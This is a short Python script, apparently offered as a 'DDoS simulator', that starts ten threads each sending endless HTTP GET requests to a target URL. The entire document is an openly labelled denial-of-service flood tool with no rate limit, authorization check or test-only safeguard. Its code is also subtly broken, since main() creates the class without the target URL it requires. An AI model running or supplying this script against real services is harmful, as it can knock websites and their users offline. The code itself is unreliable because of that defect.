```python
import requests
import threading

class DDoSSimulator:
    def __init__(self, target_url):
        self.target_url = target_url

    def send_request(self):
        while True:
            requests.get(self.target_url)

    def start_attack(self, num_threads=10):
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=self.send_request)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

def main():
    
    ddos_simulator = DDoSSimulator()
    ddos_simulator.start_attack()

if __name__ == "__main__":
    main()
```
